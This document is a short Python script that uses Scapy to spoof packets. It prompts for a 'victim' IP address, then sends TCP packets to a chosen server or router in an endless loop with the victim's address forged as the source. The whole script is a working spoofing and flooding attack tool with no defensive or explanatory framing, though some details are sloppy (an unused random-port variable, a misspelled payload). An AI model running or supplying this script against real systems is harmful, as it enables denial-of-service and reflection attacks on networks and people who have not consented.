from scapy.all import *
import socket



try:
    A = input(f"Enter the victim's IP Address or enter backspace for this ip -> [{socket.gethostbyname(socket.gethostname())}] : ") # spoofed source IP address
    if A == "":
        A = socket.gethostbyname(socket.gethostname())
    print("Victim's IP -> ",A)
    B = input("Enter the Server or router IP Address e.g. 192.168.1.1 : ") # destination IP address
    print("Destination IP -> ",B)
    C = RandShort() # Random source port
    D = 80 # destination port
    payload = "Spofing" # packet payload

    while True:
        spoofed_packet = IP(src=A, dst=B) / TCP(sport=[80, 443], dport=D) / payload
        send(spoofed_packet)
except Exception as e :
    print("Error has been occured, please make sure that the IP addresses are correct -> ",e)

